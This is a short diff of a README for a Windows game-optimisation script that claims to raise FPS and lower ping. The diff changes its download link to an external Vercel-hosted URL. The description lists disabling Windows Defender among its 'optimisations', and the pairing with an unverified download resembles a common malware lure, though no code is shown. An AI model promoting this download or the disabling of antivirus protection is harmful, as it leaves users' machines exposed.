@@ -3,7 +3,7 @@
 This script optimizes your Windows system to boost FPS and lower Ping in games like Fortnite by disabling unnecessary background processes, clearing DNS cache, and performing various system optimizations. The script also allows you to manage settings such as terminating Chrome processes, disabling Windows Defender, and clearing temporary files.
 
 ## Download
-aOps/download.vercel.app
+https://aops.vercel.app/download
 ## Features:
 - Terminate Chrome Processes
 - Disable Visual Effects
